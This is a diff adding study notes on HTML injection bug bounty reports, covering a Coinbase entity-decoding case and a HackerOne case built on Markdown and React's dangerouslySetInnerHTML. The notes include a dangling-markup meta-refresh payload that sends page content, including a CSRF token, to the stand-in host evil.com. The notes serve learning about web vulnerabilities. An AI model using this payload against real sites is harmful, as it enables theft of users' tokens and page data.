@@ -40,4 +40,48 @@
         ```
         &#60;&#104;&#49;&#62; ..........................
         ```
-        - Coinbase wouldn't filter tag and decode this string into HTML, which result website rendering <h1> tags
+        - Coinbase wouldn't filter tag and decode this string into HTML, which result website rendering <h1> tag
+
+
+
+- **Hackerone unintended HTML inclusion
+    - Markdown type of markup language uses specific syntax to generate HTML
+    - Markdown accept and parse plaintext preceded by a hash symbol(#)
+    - Syntax
+        ```
+        [text](https://torontowebsitedeveloper.com "your title tag")
+        ```
+            - This creates below HTML
+        ```
+        <a href="https://torontowebsitedeveloper.com" title="your title tag"> test </a>
+        ```
+    - <meta> tags tell browser to refresh page via the URL defined in content attribute of tag
+    - Rendering page, browser perform GET request to identified URL
+    - Content in the page can be sent as parameter of the GET request, which attacker use to extract target data
+        ```
+        <meta http-equiv="refresh" content='0;url=https://evil.com/log.php?text= 
+        ```
+
+    ```
+    <html>
+        <head>
+            <meta http-equiv="refresh" content=(a)'0;url=https://evil.com/log.php?text= 
+        </head>
+        <body>
+            <h1>Some content</h1>
+            -------------------------
+            -------------------------
+            <input type="hidden" name="csrf-token" value="ab23V........">
+            -------------------------
+            <p>attacker input with '(b) </p>
+            -------------------------
+        </body>
+    </html>
+    ```
+    - Here, Content attribute (a) to attacker input single quote would be send to attacker as part of URL's text parameter
+    - Also include CSRF token
+    - Here, HTML injection isn't issue because it uses React JS framework to render HTML
+    - React escape all HTML unless JS function dangerouslySetInnerHTML is used to directly update DOM and render HTML
+    - **DOM is an API for HTML and XML documents that allows developer to modify structure, style and content of web page via JS**
+    - As HackerOne was using dangerouslySetInnerHTML because it trust HTML it was reveiving from server. So, it inject HTML directly in DOM without escaping
+            
